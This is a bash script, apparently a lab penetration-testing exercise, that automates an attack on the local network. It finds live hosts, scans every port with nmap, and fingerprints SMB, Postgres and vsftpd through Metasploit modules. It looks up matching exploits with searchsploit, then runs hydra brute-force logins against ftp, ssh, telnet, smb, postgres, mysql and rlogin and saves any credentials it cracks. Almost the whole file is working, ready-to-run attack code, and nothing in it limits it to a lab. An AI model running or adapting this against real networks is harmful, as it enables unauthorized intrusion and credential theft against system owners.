#!/bin/bash
start=$(date +"%Y_%m_%d")
RED='\033[0;31m'
NC='\033[0m'


LOGTIME(){

date +"[%Y %m %d]  [%H:%M]"

}

REMOVE () {   #~ remove unnecessary files
	rm ip.txt &> /dev/null
	rm service.txt &> /dev/null
	rm version.txt &> /dev/null
	rm BF_target &> /dev/null
	rm victims.txt &> /dev/null
	rm ftp*  pg*  smb* scan* &> /dev/null
	rm hydra_credentials.txt  &> /dev/null
	
	}

CRUNCH () {                   #~  create password/user list
	echo -e "\nProceed to create user list using crunch"
	read -p "Enter minimum length for username." crunch_usermin
	read -p "Enter maximum length for username." crunch_usermax
	read -p "Enter username pattern." crunch_userpattern
	crunch $crunch_usermin $crunch_usermax $crunch_userpattern > user.txt
	
	echo -e "\nProceed to create password list using crunch"
	read -p "Enter minimum length for password." crunch_pwmin
	read -p "Enter maximum length for password." crunch_pwmax
	read -p "Enter password pattern." crunch_pwpattern
	crunch $crunch_pwmin $crunch_pwmax $crunch_pwpattern > pass.txt
	
}

USER_PASS () {               #~ prompt for list
	while true; do
		read -p "[?]Do you want to create list of user and passwords (Y/N)   "  list
		case $list in
		y|Y)   #~ create list
			while true; do
			read -p "[?]Use crunch to create list? (Y/N)   "  create
			case $create in
			y|Y) 
			CRUNCH
			MAN_USERPASS
			break
			;;
			n|N)
			MAN_USERPASS
			break
			;;
			*)
			echo -e "\nInvalid key."
			continue
			;;
			esac
			done
		user_list=$(realpath user.txt)
		pass_list=$(realpath pass.txt)  
		break
		;;
		n|N)   #~ user input own list
		read -p "[?]Please input user list:   "  user_list
		read -p "[?]Please input password list:   "  pass_list
		break
		;;
		*)
		echo -e "\nInvalid key."
		continue
		;;
		esac 
	done
		}



MAN_USERPASS () {                        #~ manually insert user and password


	while true; do
	read -p "[?]Insert new username/password into list?(Y/N)"  insert
			case $insert in 
			y|Y)   #~ manually insert
			echo -e '\nInsert username. Enter Q key to exit.'
			read userinput
				while [[ $userinput != 'q' && $userinput != 'Q' ]]
				do
				echo "$userinput" >> user.txt
				read userinput
				
				done	
		
			
			echo -e '\nInsert password. Enter Q key to exit.'
			read passwordinput
				while [[ $passwordinput != 'q' && $passwordinput != 'Q' ]]
				do
				echo "$passwordinput" >> pass.txt
				read passwordinput
				
				done	
			break
			;;
		
		
		
			n|N)  #~ dont manually insert
			break
			;; 
			*)
			echo -e "\nInvalid Key."
			continue
			;;
			esac 
	done
}


#~ try to set port variable
MSFCONSOLE_SMB () {
	for i in $(seq "$numofhost")
	do
	victim=$(cat scan.og | grep -i ports | sed -n "$i"p | awk '{print $2}')
	victim_port=$(cat scan.og | grep -i ports | sed -n "$i"p | tr ',' '\n' | grep "open.*smb" )

			if [[ $victim_port ]]
			then
			echo -e "[*]Enumerating $victim smb version. Please Wait."
				while [[ ! $(cat version.txt) ]]  2> /dev/null
				do

				echo 'use auxiliary/scanner/smb/smb_version' >> smb.rc
				echo "set rhosts $victim" >> smb.rc 
				echo 'run' >> smb.rc
				echo 'exit' >> smb.rc
				msfconsole -qr smb.rc -o smb_result_$victim.txt 2> /dev/null
				rm smb.rc
				cat smb_result_$victim.txt | egrep -io Samba.?"([0-9]{1,}\.)+[0-9]{1,}" | sort | uniq > version.txt
				done
			echo -e "[+]$victim smb version is $(cat version.txt)"
			echo -e "\n\n[+]$victim smb version is $(cat version.txt)" >> report_$start
			searchsploit -e $(cat version.txt) > smb_exploit_$victim.txt
			cat smb_exploit_$victim.txt >> report_$start
			rm version.txt
				
			else 
			echo "[-]$victim smb port is filtered"
			fi

	done



}


POSTGRES() {

	for i in $(seq "$numofhost")
	do
	victim=$(cat scan.og | grep -i ports | sed -n "$i"p | awk '{print $2}')
	victim_port=$(cat scan.og | grep -i ports | sed -n "$i"p | tr ' ' '\n' | grep "open.*postgres" | awk -F/ '{print $1}' )

		if [[ $victim_port ]] 
		then
		echo -e "[*]Enumerating $victim postgres version. Please Wait."
			while [[ ! $(cat version.txt) ]]  2> /dev/null
			do

			echo 'use auxiliary/scanner/postgres/postgres_version' >> pg.rc
			echo "set rhosts $victim" >> pg.rc 
			echo "set rport $victim_port" >> pg.rc 
			echo 'run' >> pg.rc
			echo 'exit' >> pg.rc
			msfconsole -qr pg.rc -o pg_result_$victim.txt  2> /dev/null
			rm pg.rc
			cat pg_result_$victim.txt | egrep -io postgresql.?"([0-9]{1,}\.)+[0-9]{1,}" | sort | uniq > version.txt   #~ .? match as few as possible
			done
		echo -e "[+]$victim Postgres version is $(cat version.txt)"
		echo -e "\n\n[+]$victim Postgres version is $(cat version.txt)" >> report_$start
		searchsploit -e $(cat version.txt) > pg_exploit_$victim.txt
		cat pg_exploit_$victim.txt >> report_$start
		rm version.txt
		else 
		echo "[-]$victim postgres port is filtered"
		fi

	done
		
		

}





#~ additional: proftpd
VSFTP () {
	
	for i in $(seq "$numofhost")
	do
	victim=$(cat scan.og | grep -i ports | sed -n "$i"p | awk '{print $2}')
	victim_port=$(cat scan.og | grep -i ports | sed -n "$i"p | tr ' ' '\n' | grep "open.*vsftp" | awk -F/ '{print $1}' )

			if [[ $victim_port ]] 
			then
			echo -e "[*]Enumerating $victim vsftp version. Please Wait."
				while [[ ! $(cat version.txt) ]] 2> /dev/null
				do
				
				echo 'use auxiliary/scanner/ftp/ftp_version' >>ftp.rc
				echo "set rhosts $victim" >> ftp.rc 
				echo "set rport $victim_port" >> ftp.rc 
				echo 'run' >> ftp.rc
				echo 'exit' >> ftp.rc
				msfconsole -qr ftp.rc -o ftp_result_$victim.txt  2> /dev/null
				rm ftp.rc
				cat ftp_result_$victim.txt | egrep -io vsftpd.?"([0-9]{1,}\.)+[0-9]{1,}" | sort | uniq > version.txt   #~ .? match as few as possible
				done
			echo -e "[+]$victim vsftp version is $(cat version.txt)"
			echo -e "\n\n[+]$victim vsftp version is $(cat version.txt)" >> report_$start 
			searchsploit -e $(cat version.txt) > ftp_exploit_$victim.txt
			cat ftp_exploit_$victim.txt >> report_$start
			rm version.txt
			else 
			echo "[-]$victim vsftp port is filtered"
			break
			fi
	
	done
	
}

SCANNING(){
CIDR=$(ip addr ls | grep -w 'inet.*brd' | awk '{print $2}')     #~CIDR
sudo netdiscover -PNr "$CIDR" > ip.txt
#~ t=$(netmask -r "$CIDR" | grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}") #~ network/broadcast id  
echo "[*]Scanning for live host(s)..." 
cat ip.txt | grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" > victims.txt #~ LAN
#~ cat ip.txt | grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | grep -vwE "111.1|111.2|254"> victims.txt   #~ for testing in NAT
nmap -iL victims.txt -sV -p- -oG scan.og -oN scan.on  > /dev/null



echo -e "[*]DATE/TIME OF SCAN:$(LOGTIME) \nNumber of found hosts:$(cat victims.txt | wc -l)"
echo "[*]DATE/TIME OF SCAN:$(LOGTIME) Number of found hosts:$(cat victims.txt | wc -l)" >> report_$start
echo -e "\nNMAP RESULTS-------------------------------------------------------------------------">> report_$start
cat scan.on >> report_$start

}


BF(){    #~ check for login service and brute force with given list
	
	
	echo -e "ftp\nsmb\npostgres\ntelnet\nsql\nssh\nrlogin" > service.txt
	#~ for i in $(cat scan.og | grep -i ports | sed -n "$i"p | awk '{print $2}') 
	for i in $(cat victims.txt)             #~ loop thru each host
	do
	
		cat scan.og | grep -i "$i" | tr ',' '\n' | grep -iv filter |grep -iE -m1 "ftp|smb|postgres|telnet|mysql|ssh|rlogin" > BF_target    #~ grep 1st login service
		
		for x in $(cat service.txt)                 #~ loop thru each service
		do
			if [[ $(grep "$x" BF_target) ]]           #~ if target has login service
			then
				z=$(awk -F/ '{print $1}' BF_target | awk '{print $NF}')
				echo "[*]Brute-forcing $i via $x port $z..."   #~ additional: add a loading 
				hydra -L "$user_list" -P "$pass_list" $i $x -t 4 -s $z > hydra.txt  2>/dev/null
				
				if [[ $(cat hydra.txt | grep -iE "host.*login.*password") ]]   #~ if found credentials
				then
				echo "[+]Credentials found. Saving to hydra_credentials.txt"
				echo -e "$(cat hydra.txt | grep -iE 'host.*login.*password') " >> hydra_credentials.txt
				rm hydra.txt
				else
				echo "[-]No Credentials found." #~ additional: go to next login service 
				fi
			fi
		done
	
	
	done
	
	
	
}


RESULT (){
	
	
	
	if [ -e $1_result_$info.txt ]  #~ if there is enumerated results
	then
		if [ "$1" == "pg" ]
		then
		echo -e "\n\n\n[*]Postgres Version:   $(cat $1_result_$info.txt | grep Postgres)"   #~ shows enumerated postgres version
		elif [ "$1" == "smb" ]
		then
		echo -e "\n\n\n[*]SMB Version:   $(cat $1_result_$info.txt | egrep -io Samba.?"([0-9]{1,}\.)+[0-9]{1,}" | sort | uniq)"   #~ shows enumerated smb version
		elif [ "$1" == "ftp" ]
		then
		echo -e "\n\n\n[*]VSFTP Version:   $(cat $1_result_$info.txt | egrep -io vsftpd.?"([0-9]{1,}\.)+[0-9]{1,}" | sort | uniq)"   #~ shows enumerated postgres version
		fi
		
	fi
		
	if [ -e $1_exploit_$info.txt ]  #~if there is exploits
	then
	echo -e "[+]Available Exploits:"
	echo -e "$(cat $1_exploit_$info.txt)"

		
	
	
	fi
	
	
	
	

}



#~ ---------------------------------------------------------------------------------------------------------


SCANNING
echo -e "\n\nENUMERATING---------------------------------------------"
numofhost=$(cat scan.og | grep -i ports | wc -l)
POSTGRES
MSFCONSOLE_SMB
VSFTP
echo -e "\n\nBRUTEFORCING---------------------------------------------"
USER_PASS
BF


echo -e "[*]DATE/TIME OF SCAN:$(LOGTIME) \nNumber of found hosts:$(cat victims.txt | wc -l)"
echo "[*]Found Hosts:"
echo "$(cat victims.txt)"

read -p "[?]Enter IP address to display information."  info
echo -e "\n\n\n\n\n\n[*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*]"
echo -e "\n\n\n=============================================="
echo -e "${RED}NMAP SCAN-OPEN PORTS${NC}"
echo -e "=============================================="
cat scan.on | sed -n "/$info/,/Service Info/p" | grep -v filtered    #~ shows nmap results
echo -e "\n\n\n\n\n\n"


if [[ $(find . -name "*exploit" -type f) ]] ; then
echo -e "\n\n\n=============================================="
echo -e "${RED}EXPLOITS${NC}"
echo -e "=============================================="
RESULT "pg"     #~ Postgres version and exploits
RESULT "smb" 	 #~ SMB version and exploits
RESULT "ftp"	 #~ VSFTP version and exploits
fi



if [[ $(cat hydra_credentials.txt | grep "$info") ]]  2>/dev/null #~ if found credentials
	then
	echo -e "\n\n\n=============================================="
	echo -e "${RED}CREDENTIALS${NC}"
	echo -e "=============================================="		
	echo -e "$(cat hydra_credentials.txt | grep "$info") "
	echo -e "\n\n\n\n\n\n\nCREDENTIALS FOUND" >> report_$start
	cat hydra_credentials.txt >> report_$start

fi



REMOVE
